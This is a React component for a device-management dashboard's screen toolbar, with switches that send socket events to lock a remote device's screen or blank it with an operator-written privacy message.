import React, { useState } from "react";
import { useTranslation } from "react-i18next";
import toast from "react-hot-toast";

import { Box, Switch, FormControlLabel, Modal, Typography, TextField, Button } from "@mui/material";

import { useSocketFunctions } from "../../utils/socket";
import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";

import CloseOutlinedIcon from "@mui/icons-material/CloseOutlined";
import CheckCircleOutlineOutlinedIcon from "@mui/icons-material/CheckCircleOutlineOutlined";

import Color from "src/theme/colors";

const ScreenToolbar = ({ visible, device }) => {
  const { t } = useTranslation();
  const { onScreenSettingEvent } = useSocketFunctions();
  const [blackStatus, setBlackStatus] = useState(false);
  const [lockStatus, setLockStatus] = useState(false);
  const [privacyText, setPrivacyText] = useState("");

  // Black Screen Option
  const onSwitchBlackScreen = async (event) => {
    const newStatus = event.target.checked;
    setBlackStatus(newStatus);
  };

  // Lock Screen Option
  const onSwitchLockScreen = async (event) => {
    const newStatus = event.target.checked;
    setLockStatus(newStatus);

    await onScreenSettingEvent(SocketIOPublicEvents.screen_setting_event, {
      type: "lockScreen",
      deviceId: device?.deviceId,
      status: newStatus,
      message: "lockScreen",
    });
  };

  // Handle the Privacy Screen OK button click
  const onPrivacyScreen = async () => {
    try {
      if (privacyText != "") {
        await onScreenSettingEvent(SocketIOPublicEvents.screen_setting_event, {
          type: "blackScreen",
          deviceId: device?.deviceId,
          message: privacyText,
          status: true,
        });
      } else {
        setBlackStatus(false);
        toast.error(t("toast.error.send-text"), {
          position: "bottom-center",
          reverseOrder: false,
          duration: 5000,
          style: {
            backgroundColor: Color.background.red_gray01,
            borderRadius: "5px",
            padding: "3px 10px",
          },
        });
      }
    } catch (error) {
      setBlackStatus(false);
      console.log("send text error", error);
    }
  };

  return (
    <Box
      className={`toolbar ${visible ? "visible" : "hidden"}`}
      sx={{
        position: "absolute",
        left: "10px",
        top: "30px",
        width: "100%",
        background: Color.background.secondary,
        zIndex: 999,
        display: "flex",
        justifyContent: "space-between",
        alignItems: "flex-start",
        padding: "10px 20px",
      }}
    >
      {/* Toolbar content */}
      <ul style={{ listStyle: "none", margin: 0, padding: 0 }}>
        <li>
          <FormControlLabel
            className="back-option"
            sx={{
              color: "white",
              fontSize: "12px",
              alignItems: "center",
              justifyContent: "start",
              display: "flex",
              flexDirection: "row-reverse",
            }}
            labelPlacement="start"
            control={
              <Switch color="primary" checked={blackStatus} onChange={onSwitchBlackScreen} />
            }
            label={t("devicesPage.monitors.black-setting")}
          />
        </li>
        {/* <li>
          <FormControlLabel
            className="back-option"
            sx={{
              color: "white",
              fontSize: "12px",
              alignItems: "center",
              justifyContent: "start",
              display: "flex",
              flexDirection: "row-reverse",
            }}
            labelPlacement="start"
            control={
              <Switch color="primary" checked={privacyScreen} onChange={onSwitchPrivacyScreen} />
            }
            label={t("devicesPage.monitors.privacy-screen")}
          />
        </li> */}
        <li>
          <FormControlLabel
            className="back-option"
            sx={{
              color: "white",
              fontSize: "12px",
              alignItems: "center",
              justifyContent: "start",
              display: "flex",
              flexDirection: "row-reverse",
            }}
            labelPlacement="start"
            control={<Switch color="primary" checked={lockStatus} onChange={onSwitchLockScreen} />}
            label={t("devicesPage.monitors.lock-setting")}
          />
        </li>
      </ul>

      {/* Modal for editing */}
      <Modal open={blackStatus}>
        <Box
          sx={{
            position: "absolute",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            width: 400,
            border: `solid 1px ${Color.background.border}`,
            backgroundColor: Color.background.main,
            borderRadius: "5px",
            p: 2,
            zIndex: 99999,
          }}
        >
          <Box
            sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}
          >
            <Typography component="h2" sx={{ color: Color.text.primary }}>
              {t("devicesPage.monitors.privacy-screen-title")}
            </Typography>
            <CloseOutlinedIcon
              onClick={() => setBlackStatus(false)}
              sx={{
                color: Color.text.primary,
                cursor: "pointer",
                fontSize: "20px",
              }}
            />
          </Box>
          <Box sx={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "10px" }}>
            <TextField
              fullWidth
              label={t("devicesPage.monitors.skeleton-input")}
              value={privacyText}
              onChange={(e) => setPrivacyText(e.target.value)} // Update the state with the inputted text
              required
            />
            <Button
              variant="contained"
              sx={{
                width: "100px",
                gap: "10px",
              }}
              onClick={onPrivacyScreen} // Call the onPrivacyScreen function when OK is clicked
            >
              <CheckCircleOutlineOutlinedIcon />
              OK
            </Button>
          </Box>
        </Box>
      </Modal>
    </Box>
  );
};

export default ScreenToolbar;
